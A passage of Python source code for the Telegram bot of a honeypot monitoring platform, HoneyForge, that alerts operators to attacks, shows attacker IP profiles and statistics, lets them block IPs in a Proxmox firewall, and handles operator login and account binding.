import asyncio
import html
import json
import os
import time
import traceback
from typing import Any, Dict, List, Optional, Tuple

import httpx

# Исправляем socks5h:// на socks5:// в окружении для совместимости с httpx
for k in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]:
    if os.environ.get(k, "").startswith("socks5h://"):
        os.environ[k] = os.environ[k].replace("socks5h://", "socks5://")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
CENTER_URL = os.getenv("HF_CENTER_URL", os.getenv("CENTER_URL", "http://center:4000")).rstrip("/")
ORCH_TOKEN = os.getenv("ORCH_TOKEN", "")


def get_proxy_url() -> Optional[str]:
    proxy_url = os.getenv("TELEGRAM_PROXY")
    if proxy_url and proxy_url.startswith("socks5h://"):
        proxy_url = proxy_url.replace("socks5h://", "socks5://")
    return proxy_url if proxy_url else None


async def get_center_subscribers() -> List[str]:
    """Получает список chat_id авторизованных операторов из центра управления."""
    url = f"{CENTER_URL}/api/internal/telegram/subscribers"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        # trust_env=False: не пускать внутренний трафик через SOCKS5-прокси
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                subs = resp.json().get("subscribers", [])
                return [str(s["chat_id"]) for s in subs if s.get("chat_id")]
    except Exception as e:
        print(f"⚠️ Не удалось получить подписчиков из центра ({e})")
    return []


async def check_user_auth(chat_id: str | int) -> Dict[str, Any]:
    """Проверяет привязку chat_id к активному оператору/админу центра."""
    url = f"{CENTER_URL}/api/internal/telegram/check-auth"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(url, json={"chat_id": str(chat_id)}, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка проверки авторизации в центре: {e}")

    # Fallback: если центр временно недоступен, но chat_id совпадает с TELEGRAM_CHAT_ID из .env
    if TELEGRAM_CHAT_ID and str(chat_id) == str(TELEGRAM_CHAT_ID):
        return {"authenticated": True, "username": "admin (fallback)", "role": "admin"}
    return {"authenticated": False}


async def bind_user_by_code(code: str, chat_id: str | int, username: Optional[str] = None) -> Tuple[bool, str]:
    """Привязывает Telegram chat_id к пользователю HoneyForge по одноразовому коду."""
    url = f"{CENTER_URL}/api/internal/telegram/bind"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(
                url,
                json={"code": code.strip().upper(), "chat_id": str(chat_id), "username": username},
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                return True, f"Оператор: <b>{data.get('username')}</b> (роль: <code>{data.get('role')}</code>)"
            detail = resp.json().get("detail", "Ошибка привязки")
            return False, detail
    except Exception as e:
        return False, f"Ошибка связи с центром: {e}"


async def login_user_by_password(username: str, password: str, chat_id: str | int, tg_username: Optional[str] = None) -> Tuple[bool, str]:
    """Прямая авторизация оператора в Telegram по логину и паролю."""
    url = f"{CENTER_URL}/api/internal/telegram/login"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(
                url,
                json={"username": username.strip().lower(), "password": password.strip(), "chat_id": str(chat_id), "tg_username": tg_username},
                headers=headers,
            )
            if resp.status_code == 200:
                data = resp.json()
                return True, f"Вы авторизованы как <b>{data.get('username')}</b> (роль: <code>{data.get('role')}</code>)"
            detail = resp.json().get("detail", "Неверный логин или пароль")
            return False, detail
    except Exception as e:
        return False, f"Ошибка связи с центром: {e}"


async def unbind_user(chat_id: str | int) -> bool:
    """Отвязывает Telegram chat_id."""
    url = f"{CENTER_URL}/api/internal/telegram/unbind"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.post(url, json={"chat_id": str(chat_id)}, headers=headers)
            return resp.status_code == 200
    except Exception:
        return False


async def send_message(chat_id: str, text: str) -> bool:
    """Личное сообщение одному оператору (код сброса пароля и т.п.). Обычный текст: без parse_mode — без HTML-инъекций."""
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        async with httpx.AsyncClient(proxy=get_proxy_url(), timeout=10.0) as client:
            response = await client.post(url, json={"chat_id": chat_id, "text": text})
    except Exception as e:
        print(f"❌ Ошибка соединения с Telegram при отправке на {chat_id}: {e}")
        return False
    if response.status_code != 200:
        print(f"❌ Ошибка Telegram (chat_id={chat_id}, код {response.status_code}): {response.text}")
        return False
    return True


async def send_document(chat_id: str | int, file_content: str | bytes, filename: str, caption: str = "") -> bool:
    """Отправляет файл (Sigma .yml, YARA .yar, Markdown .md) в Telegram чат оператора."""
    token = os.getenv("TELEGRAM_BOT_TOKEN", TELEGRAM_BOT_TOKEN)
    if not token:
        return False
    proxy_url = get_proxy_url()
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    content_bytes = file_content.encode("utf-8") if isinstance(file_content, str) else file_content
    files = {"document": (filename, content_bytes, "application/octet-stream")}
    data = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "HTML"}
    try:
        async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0) as client:
            resp = await client.post(url, data=data, files=files)
            if resp.status_code == 200:
                print(f"📄 Документ {filename} успешно отправлен в Telegram (chat_id={chat_id})", flush=True)
                return True
            print(f"❌ Ошибка отправки документа в Telegram ({filename}): {resp.text}", flush=True)
            return False
    except Exception as e:
        print(f"⚠️ Ошибка вызова sendDocument в Telegram ({filename}): {e}", flush=True)
        return False


async def get_center_session_artifacts(session_id: str) -> dict:
    """Запрашивает сгенерированные правила (Sigma, YARA) и отчёты сессии из центра."""
    if not session_id:
        return {}
    url = f"{CENTER_URL}/api/internal/session/{session_id.strip()}/artifacts"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=10.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка получения артефактов сессии {session_id} из центра: {e}", flush=True)
    return {}


SOC_MAIN_KEYBOARD = {
    "keyboard": [
        [{"text": "📊 Статистика SOC"}, {"text": "🛡️ Чёрный список IP"}],
        [{"text": "🖥️ Ловушки Proxmox"}, {"text": "🚨 Последние атаки"}],
        [{"text": "⚡ Быстрый тест"}, {"text": "⚙️ Мой статус"}]
    ],
    "resize_keyboard": True,
    "is_persistent": True
}

SOC_UNAUTH_KEYBOARD = {
    "keyboard": [
        [{"text": "⚙️ Мой статус"}, {"text": "❓ Помощь"}]
    ],
    "resize_keyboard": True,
    "is_persistent": True
}


async def get_center_stats() -> dict:
    url = f"{CENTER_URL}/api/internal/stats"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка получения статистики: {e}", flush=True)
    return {}


async def get_center_latest_events(limit: int = 5) -> list:
    url = f"{CENTER_URL}/api/internal/events/latest?limit={limit}"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка получения событий: {e}", flush=True)
    return []


async def get_center_ip_intel(ip: str) -> dict:
    url = f"{CENTER_URL}/api/internal/ip/{ip.strip()}"
    headers = {"X-Internal-Token": ORCH_TOKEN} if ORCH_TOKEN else {}
    try:
        async with httpx.AsyncClient(trust_env=False, timeout=5.0) as client:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                return resp.json()
    except Exception as e:
        print(f"⚠️ Ошибка получения досье на IP {ip}: {e}", flush=True)
    return {}


async def _render_stats_view() -> Tuple[str, dict]:
    stats = await get_center_stats()
    blocked = []
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        blocked = pm.list_blocked_ips()
    except Exception:
        pass

    total_24h = stats.get("total_24h", 0)
    alerts_24h = stats.get("alerts_24h", 0)
    auth_attempts = stats.get("auth_attempts_24h", 0)
    high_threats = stats.get("high_threats_24h", 0)
    traps_total = stats.get("traps_total", 0)
    top_ips = stats.get("top_ips", [])
    top_pwds = stats.get("top_passwords", [])
    top_usrs = stats.get("top_usernames", [])

    top_text = ""
    if top_ips:
        top_lines = [f"  • <code>{html.escape(item['ip'])}</code> — <b>{item['count']}</b> атак" for item in top_ips]
        top_text = "\n\n🔥 <b>Топ атакующих адресов:</b>\n" + "\n".join(top_lines)

    pwd_text = ""
    if top_pwds:
        pwd_lines = [f"<code>{html.escape(p)}</code>" for p in top_pwds]
        pwd_text = "\n\n🔑 <b>Частые пароли:</b> " + ", ".join(pwd_lines)

    usr_text = ""
    if top_usrs:
        usr_lines = [f"<code>{html.escape(u)}</code>" for u in top_usrs]
        usr_text = "\n👤 <b>Частые логины:</b> " + ", ".join(usr_lines)

    text = (
        f"📊 <b>HoneyForge SOC — Сводка за 24 часа</b>\n\n"
        f"• <b>Всего событий:</b> <code>{total_24h}</code>\n"
        f"• <b>Алертов и инцидентов:</b> <code>{alerts_24h}</code>\n"
        f"• <b>Критических угроз (Threat ≥70):</b> <code>{high_threats}</code> 🔥\n"
        f"• <b>Попыток взлома (брутфорс):</b> <code>{auth_attempts}</code>\n"
        f"• <b>Активных ловушек:</b> <code>{traps_total}</code>\n"
        f"• <b>Заблокировано IP в Proxmox:</b> <code>{len(blocked)}</code> 🛑"
        f"{top_text}{pwd_text}{usr_text}\n\n"
        f"🕒 <i>Время сервера: {time.strftime('%H:%M:%S UTC', time.gmtime())}</i>"
    )
    inline_kb = {
        "inline_keyboard": [
            [
                {"text": "🔄 Обновить статистику", "callback_data": "menu_stats"},
                {"text": "🛡️ Чёрный список", "callback_data": "menu_blocked"},
            ],
            [
                {"text": "🚨 Последние атаки", "callback_data": "menu_events"},
                {"text": "🖥️ Ловушки Proxmox", "callback_data": "menu_machines"},
            ]
        ]
    }
    return text, inline_kb


async def _render_blocked_view() -> Tuple[str, dict]:
    blocked = []
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        blocked = pm.list_blocked_ips()
    except Exception:
        pass

    if not blocked:
        text = (
            "🛡️ <b>Чёрный список Proxmox Firewall пуст.</b>\n\n"
            "Ни один IP-адрес на данный момент не заблокирован в кластере Proxmox.\n\n"
            "💡 <i>Чтобы вручную заблокировать подозрительный адрес, отправьте:</i>\n"
            "<code>/block &lt;IP-адрес&gt;</code> или нажмите «Заблокировать» в алерте."
        )
        inline_kb = {
            "inline_keyboard": [
                [
                    {"text": "🔄 Обновить", "callback_data": "menu_blocked"},
                    {"text": "📊 Статистика SOC", "callback_data": "menu_stats"},
                ]
            ]
        }
        return text, inline_kb

    lines = []
    inline_rows = []
    for i, r in enumerate(blocked[:10]):
        ip_val = r["ip"]
        comment = r.get("comment") or "HoneyForge Firewall Rule"
        lines.append(f"{i+1}. <code>{html.escape(ip_val)}</code> 🛑\n   <i>{html.escape(comment)}</i>")
        inline_rows.append([
            {"text": f"🔓 Снять бан {ip_val}", "callback_data": f"unblock_{ip_val}"},
            {"text": f"🔍 Досье", "callback_data": f"intel_{ip_val}"},
        ])

    inline_rows.append([
        {"text": "🔄 Обновить список", "callback_data": "menu_blocked"},
        {"text": "📊 Статистика SOC", "callback_data": "menu_stats"},
    ])
    text = (
        f"🛡️ <b>Чёрный список Proxmox Firewall ({len(blocked)}):</b>\n\n"
        + "\n\n".join(lines)
        + "\n\n<i>Нажмите «Снять бан» для разблокировки или «Досье» для просмотра истории атак:</i>"
    )
    inline_kb = {"inline_keyboard": inline_rows}
    return text, inline_kb


async def _render_ip_intel_view(ip: str) -> Tuple[str, dict]:
    is_blocked = False
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        is_blocked = pm.is_ip_blocked(ip)
    except Exception:
        pass

    intel = await get_center_ip_intel(ip)
    found = intel.get("found", False)
    status_str = "🛑 <b>ЗАБЛОКИРОВАН В PROXMOX FIREWALL</b>" if is_blocked else "🟢 <b>Не заблокирован</b>"

    if not found:
        text = (
            f"🔍 <b>SOC Досье на IP:</b> <code>{html.escape(ip)}</code>\n\n"
            f"• <b>Статус в Proxmox:</b> {status_str}\n"
            f"• <b>История в ловушках:</b> событий не зафиксировано.\n\n"
            f"<i>IP пока не проявлял активности на ваших хонипотах.</i>"
        )
    else:
        total = intel.get("total_events", 0)
        max_threat = intel.get("max_threat")
        threat_badge = f"🔥 <b>{max_threat}/100</b>" if max_threat is not None else "<i>нет оценки</i>"
        first_seen = intel.get("first_seen") or "—"
        last_seen = intel.get("last_seen") or "—"
        last_type = intel.get("last_type") or "—"
        last_detail = intel.get("last_detail") or "—"

        cmds = intel.get("commands", [])
        cmd_text = ""
        if cmds:
            cmd_lines = [f"  • <code>{html.escape(c[:65])}</code>" for c in cmds]
            cmd_text = "\n\n💻 <b>Команды хакера:</b>\n" + "\n".join(cmd_lines)

        usrs = intel.get("usernames", [])
        usr_text = ""
        if usrs:
            usr_lines = [f"<code>{html.escape(u)}</code>" for u in usrs]
            usr_text = f"\n\n👤 <b>Использовал логины:</b> " + ", ".join(usr_lines)

        text = (
            f"🔍 <b>SOC Досье на IP:</b> <code>{html.escape(ip)}</code>\n\n"
            f"• <b>Статус в Proxmox:</b> {status_str}\n"
            f"• <b>Уровень угрозы (Threat Score):</b> {threat_badge}\n"
            f"• <b>Всего событий:</b> <code>{total}</code>\n"
            f"• <b>Первая активность:</b> {first_seen}\n"
            f"• <b>Последняя активность:</b> {last_seen}\n"
            f"• <b>Последнее действие:</b> <code>{html.escape(last_type)}</code>\n"
            f"• <b>Детали:</b> <code>{html.escape(str(last_detail)[:70])}</code>"
            f"{cmd_text}{usr_text}"
        )

    inline_rows = []
    if is_blocked:
        inline_rows.append([{"text": f"🔓 Снять блокировку", "callback_data": f"unblock_{ip}"}])
    else:
        inline_rows.append([{"text": f"🛑 Заблокировать в Proxmox", "callback_data": f"block_{ip}"}])

    inline_rows.append([
        {"text": "🛡️ Чёрный список", "callback_data": "menu_blocked"},
        {"text": "🔄 Обновить досье", "callback_data": f"intel_{ip}"},
    ])
    return text, {"inline_keyboard": inline_rows}


async def _render_machines_view() -> Tuple[str, dict]:
    machines = []
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        machines = pm.list_machines()
    except Exception as e:
        print(f"⚠️ Ошибка получения машин: {e}")

    if not machines:
        text = "🖥️ <b>Машины-ловушки Proxmox:</b>\n\nЛовушки в пуле не найдены или Proxmox временно недоступен."
    else:
        m_lines = []
        for m in machines:
            vmid = m.get("vmid")
            name = m.get("name")
            ip = m.get("ip")
            status = m.get("status")
            kind = m.get("kind", "vm").upper()
            cores = m.get("cores", 1)
            mem = m.get("memory_mb", 1024)
            status_icon = "🟢" if status == "running" else "🔴"
            m_lines.append(
                f"{status_icon} <b>{kind} {vmid}</b> (<code>{html.escape(str(name))}</code>)\n"
                f"   • IP в DMZ: <code>{ip}</code>\n"
                f"   • Статус: <b>{status}</b> ({cores} CPU, {mem} MB RAM)"
            )
        text = f"🖥️ <b>Машины-ловушки Proxmox VE ({len(machines)}):</b>\n\n" + "\n\n".join(m_lines)

    inline_kb = {
        "inline_keyboard": [
            [{"text": "🔄 Обновить статус ловушек", "callback_data": "menu_machines"}]
        ]
    }
    return text, inline_kb


async def _render_events_view() -> Tuple[str, dict]:
    events = await get_center_latest_events(limit=5)
    if not events:
        text = "🚨 <b>Журнал атак пуст.</b> Зафиксированных событий пока нет."
        inline_kb = {"inline_keyboard": [[{"text": "🔄 Обновить", "callback_data": "menu_events"}]]}
        return text, inline_kb

    e_lines = []
    block_buttons = []
    for i, ev in enumerate(events):
        e_type = ev.get("type", "event")
        src = ev.get("src_ip") or "—"
        ts = ev.get("ts", "")
        detail = ev.get("detail", "")
        threat = ev.get("threat_score")
        threat_badge = f" [Threat: <b>{threat}</b>]" if threat is not None else ""

        e_lines.append(
            f"{i+1}. <b>{html.escape(e_type)}</b>{threat_badge} ({ts})\n"
            f"   • IP: <code>{html.escape(src)}</code>\n"
            f"   • Детали: <code>{html.escape(str(detail)[:65])}</code>"
        )
        if src and src != "—" and not any(src in b[0]["text"] for b in block_buttons):
            block_buttons.append([
                {"text": f"❌ Блок {src}", "callback_data": f"block_{src}"},
                {"text": f"🔍 Досье", "callback_data": f"intel_{src}"},
            ])

    inline_rows = block_buttons + [[{"text": "🔄 Обновить атаки", "callback_data": "menu_events"}]]
    text = f"🚨 <b>Последние атаки в HoneyForge ({len(events)}):</b>\n\n" + "\n\n".join(e_lines)
    inline_kb = {"inline_keyboard": inline_rows}
    return text, inline_kb


ACTIVE_SESSION_ALERTS: dict[str, dict[str, Any]] = {}


def _format_alert_message(state: dict[str, Any], is_blocked: bool) -> tuple[str, dict]:
    ip = state.get("attacker_ip") or "—"
    sid = state.get("session_id") or ""
    cmds = state.get("commands", [])
    threat = state.get("max_threat", 0)
    cat = state.get("category") or "threat"
    is_ended = state.get("is_ended", False)
    summary = state.get("summary") or ""

    ip_status_badge = " 🛑 <i>[УЖЕ ЗАБЛОКИРОВАН В PROXMOX]</i>" if is_blocked else ""
    status_suffix = " [СЕССИЯ ЗАВЕРШЕНА]" if is_ended else (" [АКТИВНАЯ СЕССИЯ]" if sid else "")

    lines = [
        f"🚨 <b>НОВАЯ АТАКА В HONEYFORGE!</b>{status_suffix}\n",
        f"<b>Тип события:</b> {html.escape(state.get('event_name', 'honeymind_threat'))}",
        f"<b>IP хакера:</b> <code>{html.escape(ip)}</code>{ip_status_badge}",
    ]
    if sid:
        lines.append(f"<b>Сессия:</b> <code>{html.escape(sid[:16])}</code>")

    threat_badge = f"🔥 <b>{threat}/100</b>" if threat >= 60 else f"⚠️ <b>{threat}/100</b>"
    lines.append(f"<b>Уровень угрозы:</b> {threat_badge} [<code>{html.escape(cat)}</code>]")

    if is_ended:
        human = state.get("is_human")
        p_human = state.get("human_probability")
        if human is not None:
            p_str = f" ({round(p_human * 100)}%)" if p_human is not None else ""
            h_text = f"👤 <b>Человек{p_str}</b>" if human else f"🤖 <b>Бот / Скрипт{p_str}</b>"
            lines.append(f"<b>Вердикт HoneyMind:</b> {h_text}")
        lines.append(f"<b>Всего команд:</b> <code>{len(cmds)}</code>")
    elif cmds:
        lines.append(f"<b>Команд перехвачено:</b> <code>{len(cmds)}</code>")

    if cmds:
        cmd_lines = [f"  • <code>{html.escape(c[:65])}</code>" for c in cmds[-5:]]
        lines.append("\n💻 <b>Команды нарушителя:</b>\n" + "\n".join(cmd_lines))
    elif summary:
        lines.append(f"\n<b>Детали (Payload):</b>\n<pre>{html.escape(summary[:250])}</pre>")
    elif state.get("raw_props"):
        lines.append(f"\n<b>Детали (Payload):</b>\n<pre>{html.escape(json.dumps(state['raw_props'], indent=2, ensure_ascii=False))}</pre>")

    intent = state.get("intent_prediction")
    if intent and isinstance(intent, dict):
        pred = intent.get("predicted_technique")
        prob = round((intent.get("probability") or 0) * 100)
        pname = intent.get("predicted_name") or ""
        if pred:
            lines.append(f"\n🎯 <b>Прогноз шага (Markov):</b>\n<code>{html.escape(pred)}</code> ({prob}%) {html.escape(pname)}")

    block_button = (
        {"text": "🛡️ IP уже в бане Proxmox", "callback_data": f"noop_{ip}"}
        if is_blocked
        else {"text": "❌ Заблокировать IP", "callback_data": f"block_{ip}"}
    )

    sid_target = sid if sid else ip
    inline_kb = {
        "inline_keyboard": [
            [
                block_button,
                {"text": "🔍 Досье на IP", "callback_data": f"intel_{ip}"},
            ],
            [
                {"text": "📥 Sigma (YAML)", "callback_data": f"sigma_{sid_target}"},
                {"text": "🔍 YARA (.yar)", "callback_data": f"yara_{sid_target}"},
            ],
            [
                {"text": "📋 Отчёт C-Level", "callback_data": f"report_{sid_target}"},
                {"text": "🎯 Прогноз (Markov)", "callback_data": f"intent_{sid_target}"},
            ],
            [
                {"text": "🗑️ Скрыть", "callback_data": "ignore"},
            ]
        ]
    }
    return "\n".join(lines), inline_kb


async def send_alert(event_name: str, attacker_ip: str, properties: dict, chat_ids: Optional[List[str]] = None):
    """
    Отправляет уведомление об атаке в Telegram всем привязанным операторам с дебаунсом и кнопками действий.
    """
    token = os.getenv("TELEGRAM_BOT_TOKEN", TELEGRAM_BOT_TOKEN)
    if not token:
        print("⚠️ [Telegram Alert] Не задан TELEGRAM_BOT_TOKEN — алерт пропущен.", flush=True)
        return

    # Собираем список адресатов
    targets = list(chat_ids or [])
    if not targets:
        targets = await get_center_subscribers()
    
    env_chat_id = os.getenv("TELEGRAM_CHAT_ID", TELEGRAM_CHAT_ID)
    if not targets and env_chat_id:
        targets = [str(env_chat_id)]

    if not targets:
        print(f"ℹ️ [Telegram Alert] Алерт '{event_name}' ({attacker_ip}) получен, но нет привязанных операторов! Выполните /login или /link в боте.", flush=True)
        return

    print(f"📤 [Telegram Alert] Отправка алерта '{event_name}' ({attacker_ip}) операторам: {targets}", flush=True)

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    proxy_url = get_proxy_url()

    # Проверяем, заблокирован ли уже этот IP в Proxmox
    is_blocked = False
    try:
        from app.services.proxmox_manager import ProxmoxManager
        pm = ProxmoxManager.from_env()
        is_blocked = pm.is_ip_blocked(attacker_ip)
    except Exception:
        pass

    sid = properties.get("session_id") or ""
    cmd = properties.get("command") or ""
    threat = properties.get("threat_score") or 0
    cat = properties.get("category") or "threat"
    summary = properties.get("summary") or ""
    intent = properties.get("intent_prediction")
    is_session_end = (event_name in ("session", "session_end") or properties.get("source_event_type") in ("session", "session_end"))

    now_ts = time.time()
    for cid in targets:
        key = f"{cid}_{sid or attacker_ip}"
        existing = ACTIVE_SESSION_ALERTS.get(key)

        # Дебаунс/живое обновление существующего алерта в рамках одной сессии
        if existing and (now_ts - existing.get("last_ts", 0) < 600) and not existing.get("is_ended"):
            existing["last_ts"] = now_ts
            if cmd and cmd not in existing["commands"]:
                existing["commands"].append(cmd)
            existing["max_threat"] = max(existing["max_threat"], threat)
            if cat:
                existing["category"] = cat
            if summary:
                existing["summary"] = summary
            if intent:
                existing["intent_prediction"] = intent
            if is_session_end:
                existing["is_ended"] = True
                if properties.get("is_human") is not None:
                    existing["is_human"] = properties.get("is_human")
                    existing["human_probability"] = properties.get("human_probability")

            msg_text, inline_kb = _format_alert_message(existing, is_blocked)
            edit_payload = {
                "chat_id": cid,
                "message_id": existing["message_id"],
                "text": msg_text,
                "parse_mode": "HTML",
                "reply_markup": inline_kb,
            }
            try:
                async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0) as client:
                    resp = await client.post(f"https://api.telegram.org/bot{token}/editMessageText", json=edit_payload)
                    if resp.status_code == 200:
                        continue
            except Exception as e:
                print(f"⚠️ Ошибка обновления алерта в Telegram ({cid}): {e}", flush=True)

        # Создание нового алерта
        state = {
            "attacker_ip": attacker_ip,
            "session_id": sid,
            "event_name": event_name,
            "commands": [cmd] if cmd else [],
            "max_threat": threat,
            "category": cat,
            "summary": summary,
            "raw_props": properties,
            "first_ts": now_ts,
            "last_ts": now_ts,
            "is_ended": is_session_end,
            "is_human": properties.get("is_human"),
            "human_probability": properties.get("human_probability"),
            "intent_prediction": intent,
        }
        msg_text, inline_kb = _format_alert_message(state, is_blocked)
        payload = {
            "chat_id": cid,
            "text": msg_text,
            "parse_mode": "HTML",
            "reply_markup": inline_kb,
        }
        try:
            async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0) as client:
                response = await client.post(url, json=payload)
                if response.status_code != 200:
                    print(f"❌ Ошибка Telegram (chat_id={cid}, код {response.status_code}): {response.text}", flush=True)
                else:
                    data = response.json()
                    msg_id = data.get("result", {}).get("message_id")
                    if msg_id:
                        state["message_id"] = msg_id
                        ACTIVE_SESSION_ALERTS[key] = state
                    print(f"✅ Уведомление успешно отправлено в Telegram (chat_id={cid})", flush=True)
        except Exception as e:
            print(f"❌ Ошибка соединения с Telegram при отправке на {cid}: {e}", flush=True)


async def _tg_post(client: httpx.AsyncClient, base_tg: str, method: str, json_data: dict, timeout: float = 25.0) -> Optional[httpx.Response]:
    """Безопасная отправка POST-запроса в Telegram API с индивидуальным таймаутом."""
    try:
        resp = await client.post(f"{base_tg}/{method}", json=json_data, timeout=timeout)
        return resp
    except Exception as exc:
        print(f"⚠️ Ошибка вызова Telegram API ({method}): {exc}", flush=True)
        return None


async def _handle_telegram_update(tg_client: httpx.AsyncClient, base_tg: str, update: dict):
    """Изолированная обработка одного события от Telegram (сообщение или callback)."""
    # 1. ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ И КОМАНД
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "").strip()
        from_user = msg.get("from", {})
        tg_username = from_user.get("username")

        if not text:
            return

        print(f"📩 Telegram сообщение от chat_id={chat_id} (@{tg_username}): {text!r}", flush=True)

        # 1.1 Команда быстрой авторизации по логину и паролю: /login <логин> <пароль>
        if text.startswith("/login"):
            parts = text.split(maxsplit=2)
            # Пытаемся сразу удалить сообщение с открытым паролем из чата для безопасности
            msg_id = msg.get("message_id")
            if msg_id:
                await _tg_post(tg_client, base_tg, "deleteMessage", {"chat_id": chat_id, "message_id": msg_id})

            if len(parts) >= 3:
                login_user = parts[1].strip()
                login_pwd = parts[2].strip()
                success, info = await login_user_by_password(login_user, login_pwd, chat_id, tg_username)
                if success:
                    reply_text = (
                        f"🎉 <b>Авторизация успешна!</b>\n\n"
                        f"{info}\n\n"
                        f"🛡️ Ваш Telegram успешно привязан к HoneyForge. "
                        f"Теперь вам моментально будут приходить алерты об атаках!\n\n"
                        f"Используйте кнопки меню внизу экрана для управления SOC."
                    )
                    kb = SOC_MAIN_KEYBOARD
                else:
                    reply_text = f"❌ <b>Ошибка входа:</b> {html.escape(info)}"
                    kb = SOC_UNAUTH_KEYBOARD
            else:
                reply_text = (
                    "ℹ️ <b>Формат команды:</b> <code>/login &lt;логин&gt; &lt;пароль&gt;</code>\n\n"
                    "Пример: <code>/login rostik mypassword</code>\n\n"
                    "<i>Сообщение с паролем удаляется ботом сразу же после обработки для безопасности.</i>"
                )
                kb = SOC_UNAUTH_KEYBOARD
            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": kb})
            return

        # 1.2 Команда привязки по одноразовому коду или старт: /start, /link, /bind
        elif text.startswith("/start") or text.startswith("/link") or text.startswith("/bind"):
            parts = text.split(maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                code = parts[1].strip()
                success, info = await bind_user_by_code(code, chat_id, tg_username)
                if success:
                    reply_text = (
                        f"🎉 <b>Telegram успешно привязан к платформе HoneyForge!</b>\n\n"
                        f"{info}\n\n"
                        f"🛡️ Теперь вам будут приходить оперативные алерты об атаках, "
                        f"и вы можете блокировать IP хакеров прямо отсюда.\n\n"
                        f"Используйте кнопки меню внизу экрана для мониторинга SOC."
                    )
                    kb = SOC_MAIN_KEYBOARD
                else:
                    reply_text = (
                        f"❌ <b>Ошибка привязки:</b> {html.escape(info)}\n\n"
                        f"Сгенерируйте свежий код в веб-панели HoneyForge "
                        f"(в правом верхнем углу: <i>«Подключить Telegram»</i>)."
                    )
                    kb = SOC_UNAUTH_KEYBOARD
            else:
                auth_status = await check_user_auth(chat_id)
                if auth_status.get("authenticated"):
                    reply_text = (
                        f"👋 <b>Добро пожаловать в HoneyForge SOC!</b>\n\n"
                        f"Вы авторизованы как <b>{auth_status.get('username')}</b> "
                        f"(роль: <code>{auth_status.get('role')}</code>).\n"
                        f"🆔 Ваш Chat ID: <code>{chat_id}</code>\n\n"
                        f"Бот подключен и готов к работе. Выберите действие в меню ниже:"
                    )
                    kb = SOC_MAIN_KEYBOARD
                else:
                    reply_text = (
                        f"👋 <b>Добро пожаловать в HoneyForge SOC Bot!</b>\n\n"
                        f"🔒 <i>Бот предназначен для операторов и администраторов платформы HoneyForge.</i>\n\n"
                        f"🆔 <b>Ваш Telegram Chat ID:</b> <code>{chat_id}</code>\n\n"
                        f"<b>Как привязать свой аккаунт:</b>\n"
                        f"1. <b>Быстрый вход:</b> отправьте <code>/login &lt;логин&gt; &lt;пароль&gt;</code> (подходит логин любого зарегистрированного оператора/админа)\n"
                        f"2. <b>Через веб-панель:</b> войдите в HoneyForge и нажмите кнопку «📱 Подключить TG»\n"
                        f"3. <b>По коду:</b> отправьте боту <code>/link &lt;код_из_панели&gt;</code> (например, <code>/link HF-A1B2C3</code>)"
                    )
                    kb = SOC_UNAUTH_KEYBOARD

            await _tg_post(tg_client, base_tg, "sendMessage", {"chat_id": chat_id, "text": reply_text, "parse_mode": "HTML", "reply_markup": kb})
            return

        # 1.3 Проверка статуса: /status или «⚙️ Мой статус»
        elif text in ("⚙️ Мой статус", "/status"):
            auth_status = await check_user_auth(chat_id)
            if auth_status.get("authenticated"):
                reply_text = (
                    f"🛡️ <b>HoneyForge SOC — Статус</b>\n\n"
                    f"🟢 <b>Статус:</b> Авторизован\n"
